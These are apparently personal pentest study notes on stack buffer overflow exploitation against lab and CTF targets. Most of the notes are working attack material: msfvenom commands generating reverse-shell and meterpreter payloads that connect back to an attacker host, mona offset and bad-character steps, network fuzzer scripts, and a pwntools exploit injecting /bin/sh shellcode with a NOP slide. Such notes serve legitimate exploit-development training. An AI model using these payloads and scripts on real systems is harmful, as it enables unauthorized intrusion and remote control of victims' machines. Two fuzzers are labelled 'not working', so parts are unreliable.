
- [[#Buffer Overflow|Buffer Overflow]]
	- [[#Buffer Overflow#Requeriments|Requeriments]]
	- [[#Buffer Overflow#Methods|Methods]]
	- [[#Buffer Overflow#GDB|GDB]]
	- [[#Buffer Overflow#PWN Tools|PWN Tools]]
	- [[#Buffer Overflow#Fuzzers|Fuzzers]]
	- [[#Buffer Overflow#Script_Strings|Script_Strings]]
	- [[#Buffer Overflow#Script to find EIP|Script to find EIP]]

## Buffer Overflow
 Write more than the capacity of the memory
- Generating cyclic patterns
  - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600

- [Buffer overflow Cheat Sheet](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)

### Requeriments
If .exe windows machine

### Methods
1. Connect to target: **nc TARGET PORT**
2. Define local folder for mona: 
  
```
!mona config -set workingfolder c:\Users\admin\Desktop\patota
```

1. Send characters to crash application: 
   1. Fuzzer script
   2. Manually:

```
python3 -c 'print("A" * 5000)'
```

2. Generate random payload to find crashing point

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [length]
```

3. Send payload exploit.py with pattern
   
4. Find Offset:
   1. Option 1: inside Mona

```
!mona findmsp -distance [length]
Response: EIP contains normal pattern : 0x39654138 (offset xxxxx)
```

  2. Option 2: using metasploit:
  
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP
```

5. Add BBBB to *retn

```
while bad_chars
  !mona bytearray -b "\x00" = remove bad chars
  strings.py = without bad chars
  !mona compare -f c:\Users\admin\Desktop\patota\bytearray.bin  -a ESP-Address

# Find EIP
!mona jmp -r esp -cpb "Badchars"
```

8. Add padding to the payload: "\x90" * 16
9. Generate shell code removing bad chars

```
#####
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4445 EXITFUNC=thread -b "\x00\x0a" -f c

msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "\x00" -f python --var-name shellcode EXITFUNC=thread 

msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "\x00" -f c

msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"

######
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.1.255 LPORT=4444 -f rb -b "BAD_CHARS" -f c

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "BAD_CHARS" -f py -v shellcode

####
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.1.255 LPORT=443 EXITFUNC=thread -f python -b "\x00"
```

- Send patterns
```
#!/usr/bin/python

import socket

host = "192.168.178.56"
port = 31337

# msf-pattern_create -l 200
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

io=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
io.connect((host, port))
io.send(pattern + "\n")

io.close()

```

### GDB
```
from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0xdeadbeef)

payload = padding + eip

print(payload)
```

- Method 1
  - Generate payload with metasploit
  - identify the value in the register (gdb i r)
  - compare patter offset
    - /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l # -q memory

- Method 2
  - Override EIP
  - Total to Override - EIP-Space
- Debugger - Reverse Engineering
  - gdb debugger
    - set exec-wrapper env -u LINES -u COLUMNS
    - run
      - Input - Buffer = Overflow
    - Find addresses:
      - disassemble [Funcion_Name]
      - print& function_Name = shows first address
    - Examine the dump hex code
      - x/100x $rsp-200
    - Show all registers
      - i r
  - [r2](https://github.com/radareorg/radare2)

- NOP instruction
  - no operation instruction = does nothing = \x90
  - python -c "print 'NOP'*no_of_nops + 'shellcode' + 'random_data'*no_of_random_data + 'memory address'"

### PWN Tools
- Debug exploit
- Commands
  - Stack canaries: detection of stack overflow
  - NX: non-executable, set memory segment to be writable or executable
  - PIR: Position Independent Executable: program dependencies into rando location

- Control EIP/RIP (instruction pointer) to execute overflow
  
- Cyclic
  - create customized overflows
  - padding = space until return address (EIP)

- Networking
  - Generate payload to overwrite eip
  
- Shellcraft
  - shell payload craft
  - find EIP with cyclic
  - find ESP ==> + 200 offset
  - How to point EIP to shellcode?
    - NOP = space holder = pass te eip to the next space
    - big lading pad of NPS + direct EIP to middle of stack = we land in our NOP + NOP will pass the eip to our code
  - payload: shellcraft
    - -f a = asci
    - -f s = string
    - shellcraf i386.linux.sh
    - shellcraft i386.linux.execve "/bin///sh" "['sh','-p']" -f 

```
from pwn import *

proc = process('./intro2pwnFinal')

proc.recvline()

padding = cyclic(cyclic_find('taaa'))

eip = p32(0xffffd510+200)

nop_slide = "\x90"*1000

# shellcraft i386.linux.sh

# shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a

shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

payload = padding + eip + nop_slide + shellcode

proc.send(payload)

proc.interactive()
```

### Fuzzers
1. Not working
```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.9.228"

port = 1337
timeout = 5
prefix = "OVERFLOW10 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

2. not working
```
#!/usr/bin/python3
import sys
import socket
from time import sleep

buffer = b"A" * 100

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('10.10.185.214', 31337))
        payload = buffer
        sock.send(payload)
        sock.close()
        sleep(1)
        buffer += b"A" * 100
        print("Sending %s bytes" % str(len(buffer)))
    except:
        print("Fuzzing crash at %s bytes" % str(len(buffer)))
        sys.exit()
```

### Script_Strings
```
#listRem = "\\x11".split("\\x")
#

for x in range(1, 256):
  #if "{:02x}".format(x) not in listRem:
    print("\\x" + "{:02x}".format(x), end='')
print()

```

### Script to find EIP
```
import socket

ip = "10.10.9.228"
port = 1337

prefix = "OVERFLOW10 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```